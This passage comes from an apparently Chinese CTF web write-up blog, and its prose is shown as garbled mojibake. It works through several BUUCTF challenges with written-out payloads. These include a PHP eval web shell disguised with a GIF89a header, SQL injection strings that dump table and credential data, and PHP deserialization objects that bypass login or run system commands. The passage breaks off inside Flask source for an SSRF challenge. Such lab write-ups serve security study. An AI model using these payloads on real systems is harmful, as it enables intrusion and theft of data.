class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://bb232cbc-9635-4f1f-bbdb-d01f82b431ee.node3.buuoj.cn/&#x27;</span><span class="comment"># urlä¸ºè¢«æ‰«æåœ°å€ï¼Œåä¸åŠ â€˜/â€™</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ª<a href="http://www.zip/">www.zip</a></p><p>å‘ç°æ˜¯ä¸€é“phpååºåˆ—åŒ–ç»•è¿‡ï¼Œè¿™é‡Œç®€åŒ–äº†ä¸€ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨pythonæäº¤getï¼ŒæˆåŠŸå¾—åˆ°flagï¼ˆè™½ç„¶ä¸çŸ¥é“ä¸ºå•¥Hackbaræäº¤æ²¡ååº”</p><blockquote><p>flag{361e4af6-f242-4f37-888e-17491b76ecd2}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>è¿›å…¥å‘ç°éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œæ„é€ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ‰”ä¸Šå»</p><p>ç”¨burpsuitesæŠ“åŒ…æ”¹ä¸€ä¸‹æ–‡ä»¶ç±»å‹</p><p>ç„¶åæç¤ºä¸èƒ½åŒ…å«&lt;?å­—ç¬¦ï¼Œå»åº¦å¨˜æœäº†ä¸€ä¸‹ä¹‹åå‘ç°å¯ä»¥åœ¨æ–‡ä»¶å¤´éƒ¨åŠ ä¸Š**GIF89a?**ç»•è¿‡è¿™ä¸ªç‚¹</p><p>ç„¶ååˆæç¤ºä¸èƒ½ç”¨phpç±»å‹æ–‡ä»¶</p><p>ä¸€ç•ªæŸ¥æ‰¾äº†ä¹‹åå‘ç°äº†ä¸€ä¸ª.phtmlç±»å‹</p><p>é‡æ–°æ„é€ äº†ä¸€ä¸‹æœ¨é©¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;rossweisse&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ç”¨èœåˆ€é“¾æ¥å³å¯å¾—åˆ°flag</p><blockquote><p>flag{43921141-5d8f-4c88-b07c-55b0801220ca}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>è¿™é¢˜ä¹Ÿæ˜¯ä¸€é“sqlæ³¨å…¥é¢˜</p><p>æŒ‰ç…§åŸæ¥çš„å¥—è·¯è¯•äº†å‡ æ¬¡ä¹‹åå‘ç°æŠŠå…³é”®å­—éƒ½banäº†</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯åŒå†™å…³é”®å­—æ¥è¿›è¡Œç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; ununionion seselectlect 1,group_concat(table_name),3  frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23 #çˆ†è¡¨å</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(column_name),3  frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;database() aandnd table_name&#x3D;&#39;b4bsql&#39; %23 #çˆ†åˆ—å</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(concat_ws(0x7e,username,passwoorrd)),3  frfromom b4bsql %23 #çˆ†æ•°æ®</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><blockquote><p>flag{cbf6aeea-a401-4c47-b000-c373eaef6289}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>è¿™é¢˜è¿›æ¥ä¹‹åå‘ç°åªæœ‰ä¸€ä¸ªpayflagé¡µé¢å¯ä»¥è¿›</p><p>è¿›å…¥ä¹‹åctrl+Uåœ¨ä¸‹é¢å‘ç°äº†ä¸€ä¸²ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—çŸ¥å’±è¦ä»¥POSTæ–¹å¼å‘é€ä¸€ä¸ªä¸æ˜¯æ•°å­—å¹¶ä¸”è¦ç­‰äº404çš„passwordå˜é‡å’Œmoneyå˜é‡</p><p>å‘ç°burpsuiteé‡å‘ä¹‹åä¼šå‡ºç°ä¸€å¥<strong>Only Cuitâ€™s students can buy the FLAG</strong></p><p>è¿™é‡Œå’±é‡æ–°æŸ¥çœ‹ä¸‹æŠ“çš„åŒ…ï¼Œå‘ç°äº†ä¸€ä¸ªuserå‚æ•°ï¼Œä»¤user=1</p><p>å‘é€å‡ºå»ä¹‹åå‰ä¸¤ä¸ªéƒ½æ­£ç¡®äº†ï¼Œä½†æ˜¯è¿˜æ˜¯å‡ºç°äº†ä¸€å¥<strong>Nember lenth is too long</strong></p><p>é‚£åªèƒ½æ˜¯moneyå‚æ•°å‡ºç°äº†é—®é¢˜ï¼Œå°†money=100000000æ”¹ä¸ºmoney=1e9å³å¯å¾—åˆ°flag</p><p><img src="https://i.loli.net/2021/03/14/LSq3PIr8Q2TlzcO.png"></p><blockquote><p>flag{68ff87f9-0c7f-4c49-b057-2af8e9ea3ed3}</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>è¿™é¢˜sqlæ³¨å…¥æƒ¯ä¾‹è¯•äº†ä¸‹<strong>1â€™ or 1=1 %23</strong></p><p>ç»“æœå¾ˆå‹å–„çš„å›äº†ä¸€å¥è‡­å¼Ÿå¼Ÿ</p><p>ä¹‹åè¯•äº†ä¸€ä¸‹å…¶ä»–çš„å‘ç°æŠŠç©ºæ ¼ç­‰ä¸€äº›å­—ç¬¦è¿˜æœ‰unionç»™banäº†ï¼Œäºæ˜¯å°±æƒ³åˆ°äº†æŠ¥é”™æ³¨å…¥</p><p><strong>1â€™or(updatexml(1,concat_ws((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e,0x7e),1))%23 #çˆ†è¡¨å</strong><br><strong>1â€™or(updatexml(1,concat_ws((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e,0x7e),1))%23 #çˆ†åˆ—å</strong><br><strong>1â€™or(updatexml(1,concat_ws((select(concat_ws(0x7e,username,password))from(H4rDsq1)),0x7e,0x7e),1))%23 #çˆ†æ•°æ®</strong>ï¼ˆç»“æœå‘ç°åªæœ‰ä¸€åŠï¼Œåé¢æŸ¥åˆ°äº†ä¸€ä¸ªright()</p><p><strong>1â€™or(updatexml(1,concat_ws((select(right(group_concat(password),20))from(H4rDsq1)),0x7e,0x7e),1))%23 #çˆ†åè¾¹çš„flag</strong>ï¼ˆè¿™é‡Œè¦æ³¨æ„flagçš„è¿æ¥ï¼Œä¸æ˜¯å¯¹åŠå¼€çš„</p><p>è¿™é‡Œæ˜¯flag</p><blockquote><p>flag{16f2507c-b985-4744-9b3b-8f02007f0c29}</p></blockquote><h2 id="å®‰æ´µæ¯easy-web"><a href="#å®‰æ´µæ¯easy-web" class="headerlink" title="å®‰æ´µæ¯easy_web"></a>å®‰æ´µæ¯easy_web</h2><h3 id="md5ç¢°æ’ç»•è¿‡"><a href="#md5ç¢°æ’ç»•è¿‡" class="headerlink" title="md5ç¢°æ’ç»•è¿‡"></a>md5ç¢°æ’ç»•è¿‡</h3><p>å­¦ä¹ åˆ°äº†å¯ä»¥é€šè¿‡md5ç¢°æ’ç»•è¿‡md5</p><p>ä½†æ˜¯æ‰¾åˆ°çš„é‚£ä¸ª.exeç¨‹åºè¿è¡Œäº†æ²¡ååº”ï¼Œæ‰€ä»¥å…ˆæŠŠå‚æ•°è®°ä¸‹æ¥åé¢ç”¨åˆ°å¯ä»¥ç›´æ¥æ‹¿æ¥å…ˆç”¨ç€</p><h2 id="ç½‘é¼æ¯phpweb"><a href="#ç½‘é¼æ¯phpweb" class="headerlink" title="ç½‘é¼æ¯phpweb"></a>ç½‘é¼æ¯phpweb</h2><p><img src="https://i.loli.net/2021/04/16/XPuztLepqZaQYWU.png"></p><h3 id="file-get-contents-å¾—åˆ°æºç "><a href="#file-get-contents-å¾—åˆ°æºç " class="headerlink" title="file_get_contents()å¾—åˆ°æºç "></a>file_get_contents()å¾—åˆ°æºç </h3><p>æŠ“åŒ…åå‘ç°å¯ä»¥è¾“å…¥ç‚¹ï¼Œå¯ä»¥çœ‹å‡ºæ˜¯æ”¾ä¸ªå‡½æ•°å’Œå‡½æ•°çš„å‚æ•°</p><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>file_get_contents()</code>å‡½æ•°æ¥å¾—åˆ°index.phpçš„æºä»£ç </p><blockquote><p>func=file_get_contents()&amp;p=index.php</p></blockquote><p>æ‹¿åˆ°index.phpæºä»£ç ä¹‹åå¯ä»¥å‘ç°funcé‚£é‡Œæ‹¦æˆªäº†è®¸å¤šå‡½æ•°ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªæœ‰ä¸€ä¸ªTestç±»å¯ä»¥è¿›è¡Œåˆ©ç”¨</p><h3 id="ååºåˆ—åŒ–RCE"><a href="#ååºåˆ—åŒ–RCE" class="headerlink" title="ååºåˆ—åŒ–RCE"></a>ååºåˆ—åŒ–RCE</h3><p>æ„é€ ååºåˆ—åŒ–ä»£ç è¿›è¡ŒRCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tipsï¼šflagå¹¶ä¸åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥è¿˜éœ€è¦<code>find / -name flag</code>æ¥æŸ¥æ‰¾flag</p><p>æœ€ç»ˆå¾—åˆ°flag</p><blockquote><p>   flag{d1569b58-26c5-4528-95fa-150f11cab19e}</p></blockquote><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="flaskæ¡†æ¶åˆ†æ"><a href="#flaskæ¡†æ¶åˆ†æ" class="headerlink" title="flaskæ¡†æ¶åˆ†æ"></a>flaskæ¡†æ¶åˆ†æ</h3><p>æ‰“å¼€é¢˜ç›®æ‹¿åˆ°ä¸€ä¸²å¾ˆé•¿å¾ˆé•¿çš„ä»£ç </p><p>ä¼˜åŒ–ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹è·¯ç”±ï¼Œæœ‰ä¸€ä¸ª/geneSignå’Œä¸€ä¸ª/De1ta</p><p>çœ‹çœ‹/geneSign</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>getæ–¹æ³•ä¼ å…¥ä¸€ä¸ªparamï¼Œç„¶ååˆ°getSignå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>md5ç¼–ç ä¸€ä¸ªéšæœºæ•°å€¼+param+action</p><p>å†çœ‹çœ‹/De1ta</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span 